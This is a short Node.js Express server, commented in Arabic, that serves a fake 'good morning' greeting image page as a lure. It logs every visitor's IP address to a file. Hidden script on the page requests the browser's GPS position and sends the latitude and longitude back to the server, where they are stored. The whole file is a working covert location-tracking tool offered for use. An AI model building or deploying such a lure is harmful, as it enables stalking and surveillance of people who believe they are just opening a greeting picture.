const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

// ملفات ثابتة (صورة)
app.use("/public", express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  // تخزين IP
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  fs.appendFileSync("ips.txt", `${ip}\n`);

  // عرض الصفحة كصورة مزيفة + طلب GPS
  res.send(`
  <!DOCTYPE html>
  <html lang="ar">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صباح الخير</title>
    <style>
      body, html {margin:0; padding:0; height:100%; display:flex; justify-content:center; align-items:center; background:#fff;}
      img {max-width:100%; height:auto;}
    </style>
  </head>
  <body>
    <img src="/public/good_morning.jpg" alt="صباح الخير">
    <script>
      // طلب الموقع (GPS)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          fetch('/location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
        });
      }
    </script>
  </body>
  </html>
  `);
});

// استقبال الموقع GPS
app.get("/location", (req, res) => {
  const data = `GPS: ${req.query.lat}, ${req.query.lon}\n`;
  fs.appendFileSync("ips.txt", data);
  res.send("OK");
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
